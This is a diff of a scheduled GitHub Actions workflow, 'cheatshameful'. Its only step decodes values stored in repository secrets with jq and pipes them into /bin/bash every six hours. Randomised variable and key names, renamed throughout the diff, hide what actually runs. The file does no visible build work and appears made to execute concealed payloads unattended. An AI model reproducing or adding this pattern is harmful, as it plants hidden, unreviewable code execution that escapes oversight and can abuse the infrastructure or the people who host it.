@@ -1,23 +1,24 @@
 name: cheatshameful
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 1/6 * * *'
+    - cron: '59 0/6 * * *'
 
-jobs:  # 12133
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: cheatshameful
         env:
-          ibfnv237: ${{ secrets.ibfnv237 }}
+          ao4: ${{ secrets.ao4 }}
         run: |
-          echo $ibfnv237 | jq -r .jfou936 | /bin/bash
-          echo $qmr9566 | jq -r .auz4 | /bin/bash
-          echo $iy8 | jq -r .lpngv402 | /bin/bash
-          echo $rqepq15691 | jq -r .dcq45674 | /bin/bash
-          echo $gqj90 | jq -r .ly72 | /bin/bash
-          echo $ikjuy96 | jq -r .xd98682 | /bin/bash
+          echo $ao4 | jq -r .xeth8385 | /bin/bash
+          echo $rfnem4 | jq -r .lrcru9064 | /bin/bash
+          echo $tpapb0 | jq -r .jyr7735 | /bin/bash
+          echo $sh51 | jq -r .z5626 | /bin/bash
+          echo $kqmc1 | jq -r .wl87 | /bin/bash
+          echo $bzwya9 | jq -r .vrn1404 | /bin/bash
+          echo $nlzv02791 | jq -r .k6 | /bin/bash
 
